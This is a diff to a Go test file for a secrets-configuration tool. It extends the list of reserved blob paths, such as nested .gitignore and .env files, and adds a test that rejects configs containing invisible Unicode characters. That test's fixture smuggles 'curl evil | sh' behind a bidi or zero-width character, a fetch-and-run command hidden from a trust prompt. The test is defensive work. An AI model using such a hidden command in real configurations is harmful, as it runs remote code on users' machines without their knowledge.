@@ -38,6 +38,8 @@ func TestBlobPathRejectsReservedTargets(t *testing.T) {
 	for _, path := range []string{
 		".gitignore", ".env", "recipients.shenv", "config.shenv",
 		".git/config", ".git/hooks/pre-commit", ".GIT/config", "./.gitignore",
+		// A nested ignore file or plaintext .env is as load-bearing as the root one.
+		"sub/.gitignore", "sub/.env", "sub/.GITIGNORE", "a/b/recipients.shenv", ".gitattributes",
 	} {
 		writeConfig(t, "backend = file\npath = "+path+"\n")
 		if _, err := Load(); err == nil {
@@ -49,6 +51,19 @@ func TestBlobPathRejectsReservedTargets(t *testing.T) {
 		writeConfig(t, "backend = file\npath = "+path+"\n")
 		if _, err := Load(); err != nil {
 			t.Fatalf("blob path %q should be allowed: %v", path, err)
+		}
+	}
+}
+
+// TestConfigRejectsInvisibleRunes: bidi overrides and zero-width characters are
+// not control characters, but they reorder or hide the command shown in the
+// trust prompt just as effectively as an escape sequence.
+func TestConfigRejectsInvisibleRunes(t *testing.T) {
+	inRepo(t)
+	for _, r := range []string{"\u202e", "\u200b", "\u2066", "\u2028"} {
+		writeConfig(t, "backend = exec\nget = cat env.shenv "+r+"; curl evil | sh\n")
+		if _, err := Load(); err == nil {
+			t.Fatalf("config containing %U must be rejected", []rune(r)[0])
 		}
 	}
 }
